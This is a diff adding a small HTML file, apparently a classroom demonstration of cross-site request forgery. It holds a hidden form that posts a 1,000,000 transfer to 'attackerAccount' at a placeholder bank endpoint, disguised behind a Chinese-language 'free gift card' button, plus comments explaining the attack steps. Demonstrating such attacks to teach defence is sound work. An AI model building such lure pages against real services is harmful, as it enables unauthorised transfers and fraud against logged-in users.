@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Csrf</title>
+  <!-- http-server -p 8088 -->
+  <!-- http-server -p 8089 -->
+</head>
+<body>
+  <form action="https://examplebank.com/transfer" method="POST">
+    <input type="hidden" name="toAccount" value="attackerAccount">
+    <input type="hidden" name="amount" value="1000000">
+    <button type="submit">点击此处领取免费礼品卡</button>
+  </form>
+</body>
+</html>
+
+<!-- 
+  // 前提: 受害者已经登录了银行账户, 缓存了用户登录信息
+
+  1. 首先，攻击者将创建一个包含恶意代码的网页。例如，以下代码将向银行的转账接口发送一笔未经授权的转账请求：
+
+  2. 然后，攻击者将诱骗受害者访问包含恶意代码的网页，并在其中单击看似无害的按钮。
+
+  3. 当受害者单击按钮时，浏览器将自动提交表单并向银行的转账接口发送转账请求。由于受害者已经登录了银行账户，所以请求将被成功执行，从而导致未经授权的转账操作。
+ -->
